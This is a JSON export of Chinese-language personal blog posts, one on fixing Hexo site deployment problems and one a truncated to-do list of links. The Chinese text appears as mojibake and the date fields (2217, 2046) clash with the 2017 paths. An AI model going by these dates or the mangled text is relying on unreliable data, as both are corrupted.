[{"title":"Hexoéƒ¨ç½²ä¸ªäººåšå®¢è®°å½•","date":"2217-01-08T18:01:01.000Z","path":"2217/01/08/2017-01-08-trouble-shooting-with-my-blog/","text":"ä½¿ç”¨ hexo å†™åšå®¢ä»¥æ¥ï¼Œè®°å½•ä¸‹æ¥çš„é—®é¢˜è¶Šæ¥è¶Šå¤šã€‚åªå¸Œæœ›ä¸‹æ¬¡å†ç¢°åˆ°åŒæ ·çš„é—®é¢˜æ—¶ï¼Œä¸è¦å†å»æµªè´¹æ—¶é—´å»æŸ¥æ‰¾ã€‚å¦‚æœæƒ³è¦ç»™è‡ªå·±çš„ blog ä¸€ä¸ªå€¼å¾—ç½®é¡¶çš„æ–‡ç« çš„è¯ï¼Œæˆ‘è§‰å¾—ä¸€ç¯‡è®°å½•ä½¿ç”¨ hexo è¿‡ç¨‹ä¸­çš„ä¸€äº›è§£å†³é—®é¢˜çš„æ–¹æ³•çš„æ–‡ç« æ˜¯å†åˆé€‚ä¸è¿‡çš„äº†ã€‚ 1. ç»å¸¸æ›´æ–° yilia çš„ themeyiliaä¸»é¢˜ç»å¸¸ä¼šæ›´æ–°ï¼ŒåŠæ—¶æ›´æ–° theme ä¼šå‘ç°å¾ˆå¤šæ–°çš„ç‰¹æ€§åŠ bug fix 2. éƒ¨ç½²ç›¸å…³ éƒ¨ç½²åˆ° github hexo clean //æ¸…é™¤ç¼“å­˜ hexo g -d //ä¸€æ­¥åˆ°ä½ = hexo g + hexo d hexo s //localost:4000æœ¬åœ°é¢„è§ˆ éƒ¨ç½²è¿‡ç¨‹ä¸­å‡ºç°çš„ä¸€äº›é”™è¯¯ $ hexo g -d INFO Start processing ERROR Process failed: _posts/2016-12-10-adb-command.md YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 3, column 11: categories: [æŠ€æœ¯] ^ at generateError (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:162:10) at throwError (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:168:9) at readBlockMapping (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1040:9) at composeNode (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1326:12) at readDocument (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1488:3) at loadDocuments (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1544:5) at Object.load (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1561:19) at parseYAML (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\hexo-front-matter\\lib\\front_matter.js:80:21) at parse (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\hexo-front-matter\\lib\\front_matter.js:56:12) at D:\\Blog\\github\\node_modules\\hexo\\lib\\plugins\\processor\\post.js:52:18 at tryCatcher (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\util.js:16:23) at Promise._settlePromiseFromHandler (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:507:35) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:567:18) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at PromiseArray._resolve (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:125:19) at PromiseArray._promiseFulfilled (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:143:14) at PromiseArray._iterate (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:113:31) at PromiseArray.init [as _init] (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:77:10) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:564:21) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at PromiseArray._resolve (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:125:19) at PromiseArray._promiseFulfilled (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:143:14) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:572:26) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at Promise._resolveCallback (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:431:57) at Promise._settlePromiseFromHandler (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:522:17) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:567:18) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\nodeback.js:42:21 at D:\\Blog\\github\\node_modules\\hexo\\node_modules\\hexo-fs\\node_modules\\graceful-fs\\graceful-fs.js:78:16 at tryToString (fs.js:455:3) at FSReqWrap.readFileAfterClose [as oncomplete] (fs.js:442:12) INFO Files loaded in 1.48 s INFO Generated: sitemap.xml INFO Generated: atom.xml INFO Generated: 2017/01/08/2017-01-08-trouble-shooting-with-my-blog/index.html INFO Generated: index.html INFO 4 files generated in 2.26 s INFO Deploying: git æ‰¾äº†å¥½ä¹…ï¼Œæœ‰è¯´â€_config.xmlâ€ æ–‡ä»¶ æœ‰ç©ºæ ¼çš„ï¼Œæœ‰è¯´ title è¢«ä¹±æ”¹çš„ï¼Œè¯•äº†å¥½é•¿æ—¶é—´ï¼Œæ”¹æˆè¿™æ ·å°±ä¸å†æŠ¥é”™äº†ã€‚æ‰€ä»¥ï¼Œå†’å·åé¢ä¸€å®šè¦åŠ ç©ºæ ¼ï¼Œè‹±æ–‡åŠè§’çš„ --- title: adbå¸¸ç”¨å‘½ä»¤æ‰‹å†Œ date: 2016-12-10 21:14:14 tags: - android - adb --- tags æœ‰ä¸¤ç§å†™æ³•ï¼Œä¸€ç§æ˜¯ä¸Šé¢è¿™æ ·å‰é¢åŠ æ¨ªæ å¦ä¸€ç§é•¿è¿™æ ·ï¼Œå†™æˆæ•°ç»„å½¢å¼ --- title: my awesometitle date: 2017-05-07 16:48:01 categories: blog tags: [linux,python] --- 3. ä¸€äº›åŠŸèƒ½çš„å®ç° ç½®é¡¶åŠŸèƒ½å°† node_modules/hexo-generator-index/lib/generator.js çš„æ–‡ä»¶å†…å®¹æ›¿æ¢æˆä»¥ä¸‹å†…å®¹ &quot;use strict&quot;; var pagination = require(&quot;hexo-pagination&quot;); module.exports = function(locals) { var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) { if (a.top &amp;&amp; b.top) { // ä¸¤ç¯‡æ–‡ç« topéƒ½æœ‰å®šä¹‰ if (a.top == b.top) return b.date - a.date; // è‹¥topå€¼ä¸€æ ·åˆ™æŒ‰ç…§æ–‡ç« æ—¥æœŸé™åºæ’ else return b.top - a.top; // å¦åˆ™æŒ‰ç…§topå€¼é™åºæ’ } else if (a.top &amp;&amp; !b.top) { // ä»¥ä¸‹æ˜¯åªæœ‰ä¸€ç¯‡æ–‡ç« topæœ‰å®šä¹‰ï¼Œé‚£ä¹ˆå°†æœ‰topçš„æ’åœ¨å‰é¢ï¼ˆè¿™é‡Œç”¨å¼‚æˆ–æ“ä½œå±…ç„¶ä¸è¡Œ233ï¼‰ return -1; } else if (!a.top &amp;&amp; b.top) { return 1; } else return b.date - a.date; // éƒ½æ²¡å®šä¹‰æŒ‰ç…§æ–‡ç« æ—¥æœŸé™åºæ’ }); var paginationDir = config.pagination_dir || &quot;page&quot;; return pagination(&quot;&quot;, posts, { perPage: config.index_generator.per_page, layout: [&quot;index&quot;, &quot;archive&quot;], format: paginationDir + &quot;/%d/&quot;, data: { __index: true } }); }; åŒæ—¶åœ¨æ–‡ç« å¼€å¤´æ·»åŠ  top : 1 å³å¯ ï¼Œå®é™…æ’åºæŒ‰ç…§è¿™ä¸ªæ•°å­—ä»å¤§åˆ°å°æ’åº å¦ä¸€ç§åšæ³•æ˜¯æ‰‹åŠ¨å°†dateæ”¹å¤§ï¼Œæ—¥æœŸè¶Šé åçš„è¶Šåœ¨å‰é¢ã€‚ title: Hexoç½®é¡¶æ–‡ç«  date: 2016-11-11 23:26:22 tags:[ç½®é¡¶] categories: Hexo top: 0 # 0æˆ–è€…1 ä¸ªäººå»ºè®®ï¼šç½®é¡¶ä¸è¦å¤ªå¤š 4. SublimeText çš„ä¸€äº›å¿«æ·é”®ç”±äºæ–‡ç« å¤§éƒ¨åˆ†éƒ½æ˜¯ä½¿ç”¨ SublimeText å†™çš„ï¼ŒTyproa è¿™ç§æ‰€è§å³æ‰€å¾—çš„ç¼–è¾‘å™¨ä¹Ÿä¸é”™ï¼Œä½†å¯¹äºæŒæ¡ MardkDown è¯­æ³•æ²¡æœ‰å¸®åŠ©ã€‚è¿™é‡Œæ‘˜å½•ä¸€äº› SubLimeText çš„å¿«æ·é”®ã€‚ Ctrl+Shift+Pï¼šæ‰“å¼€å‘½ä»¤é¢æ¿Ctrl+Pï¼šæœç´¢é¡¹ç›®ä¸­çš„æ–‡ä»¶Ctrl+Gï¼šè·³è½¬åˆ°ç¬¬å‡ è¡ŒCtrl+Wï¼šå…³é—­å½“å‰æ‰“å¼€æ–‡ä»¶ CTRL+F4 ä¹Ÿå¯ä»¥Ctrl+Shift+Wï¼šå…³é—­æ‰€æœ‰æ‰“å¼€æ–‡ä»¶Ctrl+Shift+Vï¼šç²˜è´´å¹¶æ ¼å¼åŒ–Ctrl+Dï¼šé€‰æ‹©å•è¯ï¼Œé‡å¤å¯å¢åŠ é€‰æ‹©ä¸‹ä¸€ä¸ªç›¸åŒçš„å•è¯Ctrl+Lï¼šé€‰æ‹©è¡Œï¼Œé‡å¤å¯ä¾æ¬¡å¢åŠ é€‰æ‹©ä¸‹ä¸€è¡ŒAlt+Shift+æ•°å­—ï¼šåˆ†å±æ˜¾ç¤ºCtrl+Shift+Lï¼šé€‰æ‹©å¤šè¡ŒCtrl+Shift+Dï¼šå¤åˆ¶ç²˜è´´å½“å‰è¡ŒCtrl+Xï¼šåˆ é™¤å½“å‰è¡ŒCtrl+Shift+å·¦ç®­å¤´ å¾€å·¦è¾¹é€‰æ‹©å†…å®¹Shift+å‘å·¦ç®­å¤´ å‘å·¦é€‰æ‹©æ–‡æœ¬Ctrl+B ç¼–è¯‘ï¼ŒmarkDown ç”Ÿæˆ html æ–‡ä»¶Alt+2 åˆ‡æ¢åˆ°ç¬¬äºŒä¸ª Tabï¼ˆæ‰“å¼€çš„æ–‡ä»¶ï¼Œè®°å¾— chrome æ˜¯ ctrl+2ï¼‰Ctrl+Rï¼šå‰å¾€ å¯¹åº”çš„æ–¹æ³•çš„å®ç°*å¿«é€ŸåŠ ä¸Š[] é€‰ä¸­å•è¯æŒ‰ [ å³å¯æ‰¹é‡æ›´æ”¹å½“å‰é¡µé¢ç›¸åŒçš„å•è¯ alt+F3 Ctrl+Enter åœ¨ä¸‹ä¸€è¡Œæ’å…¥æ–°çš„ä¸€è¡ŒCtrl+Shift+Enter åœ¨ä¸Šä¸€è¡Œæ’å…¥æ–°çš„ä¸€è¡ŒShift+ å‘ä¸Šç®­å¤´ å‘ä¸Šé€‰ä¸­å¤šè¡Œ Ctrl+Shift+Dï¼šå¤åˆ¶ç²˜è´´å½“å‰è¡Œ Ctrl+Shift+Enterï¼šåœ¨å½“å‰è¡Œå‰æ’å…¥æ–°è¡ŒCtrl+Mï¼šè·³è½¬åˆ°å¯¹åº”æ‹¬å·Ctrl+Uï¼šè½¯æ’¤é”€ï¼Œæ’¤é”€å…‰æ ‡ä½ç½®Ctrl+Jï¼šé€‰æ‹©æ ‡ç­¾å†…å®¹Ctrl+Fï¼šæŸ¥æ‰¾å†…å®¹Ctrl+Shift+Fï¼šæŸ¥æ‰¾å¹¶æ›¿æ¢Ctrl+Hï¼šæ›¿æ¢Ctrl+Nï¼šæ–°å»ºçª—å£Ctrl+K+Bï¼šå¼€å…³ä¾§æ Ctrl+Shift+Mï¼šé€‰ä¸­å½“å‰æ‹¬å·å†…å®¹ï¼Œé‡å¤å¯é€‰ç€æ‹¬å·æœ¬èº«Ctrl+F2ï¼šè®¾ç½®/åˆ é™¤æ ‡è®°Ctrl+/ï¼šæ³¨é‡Šå½“å‰è¡ŒCtrl+Shift+/ï¼šå½“å‰ä½ç½®æ’å…¥æ³¨é‡ŠCtrl+Alt+/ï¼šå—æ³¨é‡Šï¼Œå¹¶ Focus åˆ°é¦–è¡Œï¼Œå†™æ³¨é‡Šè¯´æ˜ç”¨çš„Ctrl+Shift+Aï¼šé€‰æ‹©å½“å‰æ ‡ç­¾å‰åï¼Œä¿®æ”¹æ ‡ç­¾ç”¨çš„F11ï¼šå…¨å±Shift+F11ï¼šå…¨å±å…æ‰“æ‰°æ¨¡å¼ï¼Œåªç¼–è¾‘å½“å‰æ–‡ä»¶Alt+F3ï¼šé€‰æ‹©æ‰€æœ‰ç›¸åŒAlt+.ï¼šé—­åˆæ ‡ç­¾Shift+å³é”®æ‹–åŠ¨ï¼šå…‰æ ‡å¤šä¸ï¼Œç”¨æ¥æ›´æ”¹æˆ–æ’å…¥åˆ—å†…å®¹Alt+æ•°å­—ï¼šåˆ‡æ¢æ‰“å¼€ç¬¬ N ä¸ªæ–‡ä»¶é¼ æ ‡çš„å‰è¿›åé€€é”®å¯åˆ‡æ¢ Tab æ–‡ä»¶æŒ‰ Ctrlï¼Œä¾æ¬¡ç‚¹å‡»æˆ–é€‰å–ï¼Œå¯éœ€è¦ç¼–è¾‘çš„å¤šä¸ªä½ç½®æŒ‰ Ctrl+Shift+ä¸Šä¸‹é”®ï¼Œå¯æ›¿æ¢è¡Œ vscodeçš„å¿«æ·é”®æœ€é‡è¦çš„ä¸€ä¸ªæ˜¯ctrl+shift+p(ç›¸å½“äºsublimeé‡Œé¢çš„å‘½ä»¤æ¨¡å¼),ctrl+påªæ˜¯åœ¨å…¨å±€æŸ¥æ‰¾æ–‡ä»¶ 5. title ä¸èƒ½ä»¥[]å¼€å¤´å‰é¢åŠ ä¸Š###ç¡®å®èƒ½å¤Ÿè®©å­—å·å˜å¤§ï¼Œä½†ä¸è¦å†™ 4 ä¸ª#ï¼Œåé¢çš„å­—æ¯ä¼šå¤§å°å†™ä¸åˆ†çš„ 6. markdown è¯­æ³•MarkDown é¡µé¢å†…éƒ¨è·³è½¬MarkDown æŠ€å·§ï¼šä¸¤ç§æ–¹å¼å®ç°é¡µå†…è·³è½¬ ä¸€ä¸ªæ˜Ÿæ˜ŸåŒ…èµ·æ¥æ˜¯æ–œä½“å­—ä¸¤ä¸ªæ˜Ÿæ˜ŸåŒ…èµ·æ¥æ˜¯ç²—ä½“å­—é‚£ä¹ˆä¸‰ä¸ªæ˜Ÿæ˜Ÿå‘¢ â€œâ€”â€œ ä¸‰æ ¹æ¨ªæ æ˜¯åˆ†å‰²çº¿ æˆ‘æ˜¯åˆ†å‰²çº¿ä¸Šé¢æˆ‘åœ¨åˆ†å‰²çº¿ä¸‹é¢ é”®ç›˜ESCä¸‹é¢é‚£ä¸ªé”®æŒ‰ä¸¤ä¸‹æ˜¯codeçš„æ„æ€ å’Œä¸€ä¸ªhtml code tag åŒæ ·çš„æ•ˆæœ å½©è‰²çš„å­— 0ã€10ã€20ã€30ã€40 ä¸‹åˆ’çº¿è¦æ€ä¹ˆæ˜¾ç¤ºå‡ºæ¥ï¼Œ åŠ è½¬ä¹‰å­—ç¬¦å°±è¡Œäº†__proto__ 7.github æäº¤ commit çš„æ—¶å€™æ˜¾ç¤º Emojié“¾æ¥åœ¨æ­¤ 8.æ¢ç”µè„‘äº†æ€ä¹ˆåŠäº²æµ‹ï¼ŒæŠŠæ•´ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨å¤åˆ¶ç²˜è´´åˆ°æ–°ç”µè„‘ä¸Šï¼Œè£…ä¸Š nodeï¼Œç„¶åè£…ä¸Š hexoï¼Œè®°å¾—å‹¾é€‰æ·»åŠ åˆ° PATH,ç„¶åå°±å¯ä»¥äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å°æ–‡ä»¶æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥å¤åˆ¶ç²˜è´´å¯èƒ½è¦åå‡ åˆ†é’Ÿã€‚ 9. æœ‰æ—¶å€™å†™çš„ä»£ç ä¼šç»™ä½ åœ¨æ¯ä¸€è¡Œå‰é¢åŠ ä¸Š trueæ¯”å¦‚å†™ä¸€æ®µ css çš„ä»£ç æ—¶å€™ï¼Œå¾ˆå¤šæ—¶å€™é¢„è§ˆä¼šç»™æ¯ä¸€è¡Œå‰é¢åŠ ä¸Šä¸€ä¸ª trueï¼Œè§£å†³åŠæ³•ï¼šç”¨ TAB é”®ç¼©è¿›å³å¯ 10. markdown-live æ˜¯ä¸€ä¸ªéå¸¸å¥½ç”¨çš„ node moduleé¡¹ç›®åœ°å€å‰ææ˜¯å®‰è£…äº† node npm install -g markdown-live md-live ç¼–è¾‘mdæ–‡ä»¶çš„åŒæ—¶ï¼Œä¿å­˜å°±ä¼šåŒæ­¥åˆ·æ–°ç½‘é¡µé¢„è§ˆï¼Œéå¸¸å¥½ç”¨ 11. å¦‚æœè¿è¡Œ hexo g ç”Ÿæˆçš„ index.html æ˜¯ç©ºçš„è¾“å‡º WARN No layout: tags/service/index.htmlåŸå› æ˜¯ themes/æ–‡ä»¶å¤¹ä¸‹æ²¡æœ‰ clone å¯¹åº”çš„ä¸»é¢˜ æ¢æˆtravisä¹‹åï¼Œåœ¨travis.ymlæ–‡ä»¶ä¸­ï¼Œæ·»åŠ äº† cache: yarn: true directories: - node_modules - themes caheä¹Ÿå°±æ„å‘³ç€åç»­ï¼Œæ‰€æœ‰å¯¹äºthemesæ–‡ä»¶å¤¹ä¸­çš„_config.ymlæ–‡ä»¶çš„ä¿®æ”¹éƒ½ä¸ä¼šç”Ÿæ•ˆã€‚è¿™ä¹Ÿå°±æ˜¯æˆ‘ä¸€ééå°è¯•æ›´æ”¹themeæ–‡ä»¶å¤¹ä¸­_configæ–‡ä»¶ä¸ç”Ÿæ•ˆçš„åŸå› ã€‚æ‰€ä»¥è¦ä¹ˆå»æ‰cache ï¼Œè¦ä¹ˆè‡ªå·±å†™bash scriptä¸€è¡Œè¡Œçš„æ”¹ã€‚ 12. markdownå†™è¡¨æ ¼ç›´æ¥åœ¨atomä¸‹é¢æ•²tableï¼Œå°±ä¼šè‡ªåŠ¨æç¤ºå‡ºæ¥çš„ ä¸€ä¸ªæ™®é€šæ ‡é¢˜ ä¸€ä¸ªæ™®é€šæ ‡é¢˜ ä¸€ä¸ªæ™®é€šæ ‡é¢˜ çŸ­æ–‡æœ¬ ä¸­ç­‰æ–‡æœ¬ ç¨å¾®é•¿ä¸€ç‚¹çš„æ–‡æœ¬ ç¨å¾®é•¿ä¸€ç‚¹çš„æ–‡æœ¬ çŸ­æ–‡æœ¬ ä¸­ç­‰æ–‡æœ¬ ä¸­é—´çš„è™šçº¿å·¦è¾¹çš„å†’å·è¡¨ç¤ºä¸‹é¢çš„å•å…ƒæ ¼å·¦å¯¹é½ï¼Œå†’å·æ”¾å³è¾¹å°±å³å¯¹é½ï¼Œå·¦å³éƒ½æ”¾ä¸€ä¸ªå°±è¡¨ç¤ºå±…ä¸­ vscodeçš„è¿”å›ä¸Šä¸€ä¸ªæ–‡ä»¶å¿«æ·é”®æ˜¯ctrl + -multiple cursorçš„å¿«æ·é”®æ˜¯ctrl + d 13 . travis ciè‡ªåŠ¨éƒ¨ç½²çš„ä¸€äº›é—®é¢˜travis ciåŠ å¯†æ–‡ä»¶æ— æ³•åœ¨travisä»¥å¤–çš„åœ°æ–¹è§£å¯†ï¼Œå› ä¸ºkey,valueéƒ½å­˜åœ¨travisçš„æ•°æ®åº“äº† travisåŠ å¯†æ–‡ä»¶åç”¨opensslè§£å¯†å‡ºç°iv undefinedçš„é”™è¯¯ iv undefined travis env listencrypted_476ad15a8e52_key=[secure]encrypted_476ad15a8e52_iv=[secure]æ˜æ˜æ˜¯å­˜åœ¨çš„ åœ¨linux é‡Œé¢è¿è¡Œtravis endpointæœç„¶æ˜¯ API endpoint: https://api.travis-ci.org/è€Œæ–°çš„endpointåº”è¯¥æ˜¯ https://api.travis-ci.com/äºæ˜¯travis encrypt-file â€“help â€“pro short-cut for â€“api-endpoint â€˜https://api.travis-ci.com/&#39;â€“org short-cut for â€“api-endpoint â€˜https://api.travis-ci.org/&#39; æ‰€ä»¥ travis encrypt-file super_secret.txt åº”è¯¥æ”¹æˆtravis encrypt-file super_secret.txt â€“pro å› ä¸ºé»˜è®¤çš„$encrypted_476ad15a8e52_keyå…¶å®å·²ç»å­˜å‚¨åœ¨travis-ci.orgä¸Šäº†æ‰€ä»¥åœ¨travis-ci.comä¸Šçš„é¡¹ç›®å½“ç„¶æ‰¾ä¸åˆ° è‡ªåŠ¨éƒ¨ç½²çš„å¦ä¸€ä¸ªå®ä¾‹ 14. hexo serveræœ¬åœ°é¢„è§ˆå‡ºç°çš„é—®é¢˜hexo s æœ¬åœ°é¢„è§ˆæ ·å¼åŠ è½½å¤±è´¥ is not executable, and strict MIME type checking is enabled.) hexo serverçš„æ„æ€æ˜¯ç±»ä¼¼äºexpressçš„serve staticåŠŸèƒ½ï¼Œé»˜è®¤åªå¤„ç†publicæ–‡ä»¶ä¸‹çš„æ–‡ä»¶ï¼Œæ‰€ä»¥å¦‚æœæœ¬åœ°è¿è¡Œhexo s å‡ºç°404çš„è¯ï¼Œç›´æ¥copyåˆ°publicæ–‡ä»¶å¤¹ä¸‹å°±å¯ä»¥äº†æ³¨æ„hexo clearä¼šåˆ æ‰publicæ–‡ä»¶å¤¹ [Refused to Execute Script From Because Its MIME Type (Text/plain) Is Not Executable, and Strict MIME Type Checking Is Enabled]è¿™å¥è¯çš„æ„æ€,è¿™å…¶å®æ˜¯æˆ‘æœ¬åœ°è·‘hexo serverçš„æ—¶å€™ï¼Œæ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªxx.jsæ–‡ä»¶ï¼Œæ‰€ä»¥expressè¿”å›äº†ä¸€ä¸ªç±»ä¼¼äº404çš„plain textï¼ˆè€Œä¸æ˜¯jsæ–‡ä»¶ï¼‰ï¼Œæ‰€ä»¥å°±å‡ºè¿™ä¸ªé—®é¢˜äº†ã€‚ 15. yiliaçš„ä¸»é¢˜é‡Œé¢badjs reportçš„é—®é¢˜yiliaçš„ä¸»é¢˜é‡Œé¢æœ‰ä¸€ä¸ªbadjsçš„reportï¼Œå»æ‰çš„æ–¹æ³•ï¼šcd åˆ°themes/yiliaé‡Œé¢,rm -rf source/ , ç„¶åæŠŠsource-srcé‡Œé¢çš„report.jsé‡Œé¢çš„ä¸œè¥¿åˆ æ‰ã€‚yarn install ,yarn dist ,ç„¶åå›åˆ°ä¸Šå±‚ç›®å½•ã€‚hexo clean , hexo gå°±å¯ä»¥äº†ã€‚å…¶å®çœ‹ä¸‹é‡Œé¢ï¼Œå°±æ˜¯ä¸€ä¸ªwebpackçš„é…ç½®ï¼Œè‡ªå·±é‡æ–°ç¼–è¯‘ä¸€ä¸‹å°±å¥½äº†ã€‚ç¼–è¯‘åä¼šåœ¨sourceé‡Œé¢é‡æ–°ç”Ÿæˆéœ€è¦çš„jsæ–‡ä»¶ã€‚å¥‡æ€ªçš„æ˜¯åœ¨windowsä¸Šç¼–è¯‘å¤±è´¥ï¼Œåœ¨linuxä¸Šç¼–è¯‘å¤±è´¥ï¼Œåœ¨macä¸Šç»ˆäºæˆåŠŸäº†ã€‚ 16. hexo serverenospcçš„è§£å†³æ–¹å¼ç”±äºéœ€è¦ç›‘å¬å¤šä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥linuxä¸‹å…è®¸ç›‘å¬çš„æ–‡ä»¶æ•°æœ‰ä¸ªä¸Šé™ï¼Œè¿™é‡Œä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥äº† 17. hexoè‡ªå¸¦çš„ä»£ç é«˜äº®æœ‰ä¸€äº›ä¸æ˜¯å¾ˆå¥½çš„åœ°æ–¹æ”¹ç”¨highlightjså°±å¯ä»¥äº†ã€‚é¦–å…ˆè¦æŠŠæœ€å¤–é¢çš„_config.ymlé‡Œé¢çš„é«˜äº®å…³æ‰ highlight: enable: false ç”±äºæœ€ç»ˆç”Ÿæˆçš„htmlæ–‡ä»¶ä¸­å¼•ç”¨çš„æ˜¯themeä¸­webpack -p æ‰“å‡ºæ¥çš„jsæ–‡ä»¶ï¼Œæ‰€ä»¥ç…§ç€highlightjsçš„è¯´æ˜ä¿®æ”¹ä¸€ä¸‹yiliaçš„æºç ï¼Œsource-srcç›®å½•ï¼Œnpm install highlight.js â€“saveé‡æ–°yarn distå°±å¥½äº†ã€‚yiliaçš„themeä¿®æ”¹è¿˜ç®—ç®€å•ã€‚ 18. hexoæ¸²æŸ“mdæ–‡ä»¶æ—¶æœ‰äº›ç‰¹å®šå­—ç¬¦ä¸²æ˜¯ä¸èƒ½å†™çš„hexoæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªjsæ¨¡æ¿æ¸²æŸ“å·¥å…·ï¼Œå’Œjinjaï¼Œhandlerbarsè¿™ä¸€ç±»æ¨¡æ¿ä¸€æ ·ï¼Œç»å¸¸ä¼šç”¨èŠ±æ‹¬å·åŒ…èµ·æ¥è¡¨ç¤ºä¸€ä¸ªå˜é‡ä¸‹é¢è¿™ä¸ªï¼Œç¾å…ƒç¬¦å·åŠ ä¸€ä¸ªèŠ±æ‹¬å·æŠ±èµ·æ¥çš„äº•å·å°±ä¸èƒ½å•ç‹¬æ‹¿å‡ºæ¥å†™ ${#} æŠ¥çš„é”™å¤§æ¦‚é•¿è¿™æ · Template render error: (unknown path) [Line 101, Column 142] unexpected token: }} åŸå› æ˜¯è¿™ç§çœ‹ä¸Šå»åƒæ˜¯å¼•ç”¨ä¸€ä¸ªå˜é‡çš„ä¸œè¥¿æ˜¯æŸäº›jsåº“çš„ä¿ç•™syntax å‚è€ƒ Hexo åšæ–‡ç½®é¡¶æŠ€å·§ SublimeText å¿«æ·é”® MarkDown è¯­æ³•å­¦èµ·æ¥å¾ˆå¿«çš„ travis è‡ªåŠ¨éƒ¨ç½² Legacy GitHub Services to GitHub Apps Migration Guide 2018å¹´10æœˆ1å·ä¹‹åä¸å†æ”¯æŒ Legacy GitHub Service","tags":[{"name":"ç½®é¡¶","slug":"ç½®é¡¶","permalink":"https://haldir65.github.io/tags/ç½®é¡¶/"},{"name":"hexo","slug":"hexo","permalink":"https://haldir65.github.io/tags/hexo/"}]},{"title":"å³åˆ»å¤‡å¿˜å½•","date":"2046-12-18T22:58:14.000Z","path":"2046/12/18/2017-12-18-random-new-thoughts/","text":"ä¸€ä¸ªå¾…åŠäº‹é¡¹çš„ä»“åº“ æœŸå¾…èƒ½å¤Ÿå®Œæˆçš„ ä¸ªäººåˆ†äº«â€“web å‰ç«¯å­¦ä¹ èµ„æºåˆ†äº« PWA æ‰€ä»£è¡¨çš„ Web å¼€å‘åº”æ˜¯æœªæ¥æ®è¯´Electronè¦è¢«PWAå¹²æ‰ js å¾ªç¯é—­åŒ…çš„è§£å†³æ–¹æ³• [ ] shadowsocks-androidæºç ï¼ˆæ®è¯´æ˜¯èµ·äº†ä¸€ä¸ªcè¿›ç¨‹å®ˆæŠ¤ï¼‰ [ ] chromium netç§»æ¤åˆ°Androidå¹³å°cronetæ˜¯æœ€ç®€å•çš„æ–¹å¼ æ›´å¤šä¸‹è½½ä»“åº“ [ ] lightboxä¸€ä¸ªå¾ˆå¥½çœ‹çš„jså›¾ç‰‡æŸ¥çœ‹åº“ [ ] ä¸€ä¸ªå¾ˆå¥½çœ‹çš„h5éŸ³ä¹æ’­æ”¾å™¨ [ ] ä»¿é—¨æˆ·ç½‘ç«™jsç›¸å†Œï¼Œ jsç›¸å†Œ2 [ ] å…«å¤§æ’åºç®—æ³•çš„pythonå®ç° [ ] 